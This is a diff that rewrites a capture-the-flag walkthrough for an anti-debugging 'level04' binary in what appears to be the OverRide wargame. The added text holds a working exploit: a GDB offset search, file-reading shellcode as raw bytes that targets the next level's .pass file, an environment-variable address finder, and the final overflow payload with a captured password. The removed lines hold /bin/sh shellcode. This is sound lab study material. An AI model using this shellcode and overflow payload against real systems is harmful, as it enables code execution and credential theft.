@@ -1,6 +1,3 @@
-# Level4 - Anti-Debugging Challenge Walkthrough
-
-## Overview
 Level4 implements **anti-debugging protection** using `fork()`, `ptrace()`, and process monitoring. The program creates a child process that sets up debugging protection, while the parent monitors for debugging attempts. However, it contains a **buffer overflow vulnerability** in the `gets()` function that can be exploited with shellcode.
 
 ## Key Assembly Analysis
@@ -55,104 +52,76 @@ Level4 implements **anti-debugging protection** using `fork()`, `ptrace()`, and 
 
 ## Vulnerability Analysis
 
-### Buffer Overflow in gets()
-```c
-char buffer[32];  // 32-byte buffer on stack
-gets(buffer);     // No bounds checking - VULNERABLE!
+The program uses `gets(buffer)` with **no bounds checking**, making it vulnerable to buffer overflow attacks.
+
+### 1. Calculate Buffer Offset
+
+Use GDB to find the exact offset:
+```bash
+gdb ./level04
+(gdb) set follow-fork-mode child
+(gdb) run
+Starting program: /home/users/level04/level04 
+[New process 2911]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 2911]
+0x41326641 in ?? ()
 ```
 
-**Issues:**
-- `gets()` has no bounds checking
-- Can overflow buffer and overwrite return address
-- Stack-based buffer overflow vulnerability
+**Result**: `0x41326641` → Offset: **156 bytes**
 
-### Stack Layout
-```
-High Address
-+------------------+
-| Return Address   | <- Target for overflow
-+------------------+
-| Saved EBP        |
-+------------------+
-| Local Variables  |
-+------------------+
-| buffer[32]       | <- 32-byte buffer
-+------------------+
-Low Address
-```
+### 2. Select Appropriate Shellcode
 
-## Exploitation Strategy
+Since ptrace() monitors child memory, we **cannot use exec-based shellcode** (like `exec("/bin/sh)`) because:
+- `exec()` keeps the process ID but replaces all program and memory
+- This triggers the anti-debugging detection
 
-### Step 1: Understand the Protection
-- Anti-debugging prevents traditional debugging
-- Must use shellcode injection instead
-- Buffer overflow bypasses ptrace protection
+Instead, use **file-reading shellcode** that opens and reads the password file directly:
+- **Source**: https://shell-storm.org/shellcode/files/shellcode-73.html
+- **Function**: Opens and reads `/home/users/level05/.pass`
 
-### Step 2: Calculate Buffer Offset
-- Buffer size: 32 bytes
-- Need to find exact offset to return address
-- Use pattern generation to find offset
+### 3. Store Shellcode in Environment Variable
 
-### Step 3: Create Shellcode
-```python
-# Basic shellcode for /bin/sh
-shellcode = (
-    "\x31\xc0"              # xor eax, eax
-    "\x50"                  # push eax
-    "\x68\x2f\x2f\x73\x68"  # push "//sh"
-    "\x68\x2f\x62\x69\x6e"  # push "/bin"
-    "\x89\xe3"              # mov ebx, esp
-    "\x50"                  # push eax
-    "\x53"                  # push ebx
-    "\x89\xe1"              # mov ecx, esp
-    "\xb0\x0b"              # mov al, 11
-    "\xcd\x80"              # int 0x80
-)
-```
-
-### Step 4: Build Exploit
-```python
-# Exploit structure
-payload = shellcode + "A" * (offset - len(shellcode)) + return_address
-```
-
-## Testing Commands
+Export the shellcode as an environment variable and find its address:
 
 ```bash
-# Run the program
-./level04
-
-# Expected output
-Give me some shellcode, k
-
-# Send exploit payload
-python -c "print('shellcode + padding + return_address')" | ./level04
+export w=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
 ```
 
-## Expected Results
+### 4. Find Shellcode Address
 
-1. **Normal execution**: Program waits for input
-2. **With debugger**: Infinite loop or "child is exiting..."
-3. **With shellcode**: Shell access in child process
-4. **Success**: `$` prompt from shell
+Create a C program to get the environment variable address:
 
-## Key Points
+```bash
+echo '#include <stdio.h>
+#include <stdlib.h>
 
-- **Anti-debugging**: Uses ptrace and process monitoring
-- **Vulnerability**: Buffer overflow in gets() function
-- **Exploitation**: Shellcode injection via buffer overflow
-- **Protection bypass**: Direct code execution in child process
-- **Stack layout**: 32-byte buffer with return address overwrite
-- **System calls**: fork(), ptrace(), wait(), gets(), kill()
+int main() {
+    printf("%p\n", getenv("w"));
+    return 0;
+}' > /tmp/find.c
 
-## Exploitation Steps
+gcc -m32 /tmp/find.c -o /tmp/find
+./find
+```
 
-1. **Analyze the assembly** to understand anti-debugging
-2. **Identify the vulnerability** in gets() function
-3. **Calculate buffer offset** to return address
-4. **Create shellcode** for /bin/sh execution
-5. **Build exploit payload** with proper structure
-6. **Test the exploit** to get shell access
+**Result**: Address = `0xffffdf4b`
 
-The challenge requires **bypassing anti-debugging protection** through **buffer overflow exploitation** rather than traditional debugging techniques.
+## Exploitation
 
+### 1. Create the Payload
+
+```bash
+python -c "print 156 * 'a' + '\x4b\xdf\xff\xff'" | ./level04
+```
+
+### 2. Execute the Exploit
+
+
+level04@OverRide:~$ python -c "print 156 * 'a' + '\x4b\xdf\xff\xff'" | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
